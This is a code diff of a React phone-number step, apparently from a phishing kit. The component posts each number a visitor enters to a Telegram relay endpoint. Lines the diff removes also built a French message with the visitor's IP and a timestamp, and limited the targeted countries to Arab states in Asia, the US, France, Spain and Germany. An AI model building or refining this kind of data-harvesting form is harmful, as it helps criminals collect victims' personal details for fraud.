@@ -2,26 +2,6 @@ import React, { useState } from 'react';
 import { Shield, ArrowRight } from 'lucide-react';
 import PhoneInput, { isValidPhoneNumber } from 'react-phone-number-input';
 
-// Countries allowed: only Arab countries in Asia, plus USA and (FR, ES, DE)
-const ALLOWED_COUNTRIES = [
-  // Arab countries in Asia only
-  'AE', // UAE
-  'BH', // Bahrain
-  'IQ', // Iraq
-  'JO', // Jordan
-  'KW', // Kuwait
-  'LB', // Lebanon
-  'OM', // Oman
-  'QA', // Qatar
-  'SA', // Saudi Arabia
-  'SY', // Syria
-  'YE', // Yemen
-  // USA
-  'US',
-  // Selected Europe
-  'FR','ES','DE'
-] as const;
-
 interface PhoneStepProps {
   phoneNumber: string;
   updatePhoneNumber: (value: string) => void;
@@ -33,17 +13,7 @@ const PhoneStep: React.FC<PhoneStepProps> = ({ phoneNumber, updatePhoneNumber, o
 
   const sendPhoneToTelegram = async (phone: string) => {
     try {
-      const forwardedFor = (window.location.hostname === 'localhost' ? '127.0.0.1' : '');
-      const remoteIp = forwardedFor || '127.0.0.1';
-      
-      const phoneText = [
-        '📩 Numéro de téléphone saisi:',
-        `📱 Téléphone: ${phone}`,
-        `🌐 IP: ${remoteIp}`,
-        `🕒 Heure: ${new Date().toLocaleString('fr-FR')}`
-      ].join('\n');
-
-      await fetch('http://localhost:5176/api/telegram/send', {
+      await fetch('/api/telegram/send', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
@@ -85,8 +55,7 @@ const PhoneStep: React.FC<PhoneStepProps> = ({ phoneNumber, updatePhoneNumber, o
         <div className="relative">
           <PhoneInput
             international
-            defaultCountry="AE"
-            countries={ALLOWED_COUNTRIES as unknown as string[]}
+            defaultCountry="SA"
             value={phoneNumber}
             onChange={(value) => updatePhoneNumber(value || '')}
             className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-xl focus-within:ring-2 focus-within:ring-blue-500 focus-within:border-transparent px-3 py-2"
